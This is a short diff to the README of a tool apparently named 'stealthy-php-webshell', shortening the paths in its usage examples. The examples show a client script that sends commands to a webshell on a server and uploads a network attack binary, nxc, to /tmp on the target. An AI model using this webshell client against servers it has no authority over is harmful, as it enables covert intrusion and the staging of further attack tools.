@@ -10,7 +10,7 @@ Python
 
 ### Command Execution
 ```
-/bin/python /home/piotr/tools/stealthy-php-webshell/client_obf.py [URL] [name of the webshell file on server]
+/bin/python client_obf.py [URL] [name of the webshell file on server]
 ```
 
 #### Example:
@@ -22,5 +22,5 @@ It is made for a specific purpose - you may want to change the source code.
 
 ### File Upload
 ```
-/bin/python /home/piotr/tools/stealthy-php-webshell/client_obf.py https://yourwebsite.local whatever.php --upload /usr/bin/nxc --remote-path /tmp/nxc 
+/bin/python client_obf.py https://yourwebsite.local whatever.php --upload /usr/bin/nxc --remote-path /tmp/nxc 
 ```
